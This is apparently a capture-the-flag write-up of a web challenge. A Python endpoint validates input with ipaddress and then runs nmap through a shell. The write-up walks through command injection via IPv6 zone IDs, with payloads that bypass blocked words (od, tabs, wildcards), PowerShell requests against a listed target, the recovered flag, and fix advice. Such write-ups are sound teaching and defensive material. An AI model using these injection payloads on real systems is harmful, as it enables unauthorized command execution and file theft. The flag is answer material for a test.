# 0day on ipaddress - Detailed Writeup

## Challenge
- Name: `0day on ipaddress`
- Category: Web
- Flag format: `upCTF{...}`

## Summary
The `/check` endpoint tries to validate an IP address with Python's `ipaddress.ip_address()`, then builds a shell command string and executes it with `shell=True`.

This creates command injection because IPv6 zone identifiers (scope IDs) are accepted by `ipaddress`, including characters like `;`. The app assumes "valid IP" means "safe shell input", which is false.

## Relevant Code Behavior
From `server.py`:
1. User-controlled `ip` is read from query string.
2. `ipaddress.ip_address(ip)` is used as validation.
3. The app runs:
   - `nmap -F -sV {ip}`
   - or `nmap -sV -p {port} {ip}`
4. Execution is done with `subprocess.run(command, shell=True, ...)`.

### Weak filters
The app blocks some substrings and symbols in the `ip` string:
- blocked command words: `flag`, `txt`, `cat`, `echo`, ...
- blocked symbols: `$`, `"`, `'`, `\\`, `@`, `,`, `*`, `&`, `|`, `{`, `}`

But it does **not** block:
- `;` command separator
- tab `%09` (works as whitespace in shell)
- wildcard `?`
- shell redirection style with compatible payloads

It also blocks response output containing `{`, which is intended to hide direct flag output.

## Vulnerability Root Cause
The root issue is this trust chain:
1. `ipaddress` accepts IPv6 with zone ID, including payload-like characters.
2. The raw input is interpolated into a shell command string.
3. The command is executed in a shell.

Validation is syntactic IP validation, not command safety.

## Exploitation Strategy
### 1. Confirm endpoint works
`GET /check?ip=127.0.0.1`

### 2. Confirm command injection
Use IPv6 zone-id payload with `;ls`:
`GET /check?ip=::1%0;ls`

Remote output showed files including:
- `flag`
- `flag.php`
- `flag.tx`
- `flag.txt`

### 3. Bypass blacklist and output filter
Direct reads like `cat flag.txt` are blocked by substring filters (`cat`, `flag`, `txt`).

Bypass used:
- `od` instead of `cat`
- tab (`%09`) instead of space
- `fla?.t?t` instead of `flag.txt` to avoid blocked substrings

Final payload:
- raw: `::1%0;od\tfla?.t?t`
- url-encoded: `%3A%3A1%250%3Bod%09fla%3F.t%3Ft`

Request:
`GET /check?ip=%3A%3A1%250%3Bod%09fla%3F.t%3Ft`

### 4. Decode octal dump
`od` output looked like:
`0000000 070165 052103 ... 005175`

Each 6-digit octal word is two bytes in little-endian order. Decode all words to bytes, then to text.

Decoded result:
`upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-FsEyppln13d4d191}`

## Flag
`upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-FsEyppln13d4d191}`

## Reproduction Commands
## PowerShell (live target)
```powershell
# Baseline
Invoke-WebRequest -UseBasicParsing "http://46.225.117.62:30027/check?ip=127.0.0.1" | Select-Object -ExpandProperty Content

# Injection test
Invoke-WebRequest -UseBasicParsing "http://46.225.117.62:30027/check?ip=%3A%3A1%250%3Bls" | Select-Object -ExpandProperty Content

# Exfiltrate encoded bytes from flag.txt
Invoke-WebRequest -UseBasicParsing "http://46.225.117.62:30027/check?ip=%3A%3A1%250%3Bod%09fla%3F.t%3Ft" | Select-Object -ExpandProperty Content
```

## Python decoder snippet
```python
words = """070165 052103 075506 030150 057567 032143 057556 057461 071167 072061
057463 030164 032137 057556 070151 062064 071144 071545 037563 026441
071506 074505 070160 067154 031461 032144 030544 030471 005175""".split()

out = bytearray()
for w in words:
    v = int(w, 8)
    out.extend((v & 0xff, (v >> 8) & 0xff))

print(out.decode("latin1"))
```

## Security Fix Recommendations
1. Never use `shell=True` for this case.
2. Pass arguments as a list and avoid shell parsing:
   - `subprocess.run(["nmap", "-F", "-sV", ip], shell=False, ...)`
3. Canonicalize IP after validation using the parsed object:
   - `safe_ip = str(ipaddress.ip_address(ip))`
4. Explicitly reject IPv6 zone IDs if not needed.
5. Remove blacklist-based filtering. Use strict allow-list validation and safe process APIs.
6. Add tests for payloads containing `;`, `%`, tabs, wildcard chars, and IPv6 scope IDs.

## Takeaways
- "Valid input" is not equal to "safe for shell".
- Blacklists are fragile and easy to bypass.
- If a command must run, avoid shell interpretation entirely.
